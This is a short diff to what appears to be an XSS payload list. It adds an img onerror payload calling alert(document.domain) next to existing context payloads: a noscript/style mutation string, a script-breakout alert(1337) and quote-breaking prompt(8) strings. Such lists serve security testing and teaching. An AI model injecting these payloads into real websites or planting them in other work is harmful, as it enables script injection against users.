@@ -38,6 +38,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <noscript> &amp;lt;p title=” &lt;/noscript&gt;
 &lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
 }}});};alert(1337);
+<img src=xx onerror=alert(document.domain)>
 
 "-prompt(8)-"
 '-prompt(8)-'
